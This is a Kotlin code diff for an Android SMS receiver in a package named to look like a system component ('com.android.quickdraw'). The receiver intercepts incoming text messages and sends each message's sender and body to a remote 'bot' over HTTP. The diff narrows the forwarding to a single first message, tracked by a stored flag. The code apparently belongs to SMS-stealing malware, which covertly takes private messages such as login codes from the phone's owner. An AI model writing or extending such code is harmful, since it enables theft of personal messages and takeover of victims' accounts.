@@ -3,6 +3,7 @@ package com.android.quickdraw
 import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
+import android.content.SharedPreferences
 import android.os.Bundle
 import android.provider.Telephony
 import okhttp3.*
@@ -12,37 +13,48 @@ import java.io.IOException
 
 class SmsReceiver : BroadcastReceiver() {
     private val client = OkHttpClient()
+    private val PREFS_NAME = "SmsPrefs"
+    private val SMS_SENT_KEY = "sms_sent"
 
     override fun onReceive(context: Context, intent: Intent) {
         when (intent.action) {
-            Telephony.Sms.Intents.SMS_DELIVER_ACTION, // Для входящих SMS
-            "android.provider.Telephony.SMS_RECEIVED" -> { // Альтернативное действие
-                handleSms(intent)
+            Telephony.Sms.Intents.SMS_DELIVER_ACTION,
+            "android.provider.Telephony.SMS_RECEIVED" -> {
+                // Проверяем, не отправляли ли уже SMS
+                val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
+                if (prefs.getBoolean(SMS_SENT_KEY, false)) {
+                    return
+                }
+                
+                handleSms(context, intent)
             }
         }
     }
 
-    private fun handleSms(intent: Intent) {
-        // Способ 1 (предпочтительный для новых версий Android)
+    private fun handleSms(context: Context, intent: Intent) {
+        val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
+        
+        // Пытаемся получить сообщение современным способом
         val smsMessages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
-        smsMessages?.forEach { sms ->
+        smsMessages?.firstOrNull()?.let { sms ->
             sendSmsToBot(
                 sender = sms.originatingAddress ?: "Unknown",
                 message = sms.messageBody ?: "Empty message"
             )
+            prefs.edit().putBoolean(SMS_SENT_KEY, true).apply()
+            return
         }
 
-        // Способ 2 (для обратной совместимости)
+        // Fallback для старых устройств
         val bundle: Bundle? = intent.extras
-        if (bundle != null) {
-            val pdus: Array<Any?>? = bundle.get("pdus") as Array<Any?>?
-            pdus?.forEach { pdu ->
-                val smsMessage = android.telephony.SmsMessage.createFromPdu(pdu as ByteArray)
-                sendSmsToBot(
-                    sender = smsMessage.originatingAddress ?: "Unknown",
-                    message = smsMessage.messageBody ?: "Empty message"
-                )
-            }
+        val pdus: Array<Any?>? = bundle?.get("pdus") as Array<Any?>?
+        pdus?.firstOrNull()?.let { pdu ->
+            val smsMessage = android.telephony.SmsMessage.createFromPdu(pdu as ByteArray)
+            sendSmsToBot(
+                sender = smsMessage.originatingAddress ?: "Unknown",
+                message = smsMessage.messageBody ?: "Empty message"
+            )
+            prefs.edit().putBoolean(SMS_SENT_KEY, true).apply()
         }
     }
 
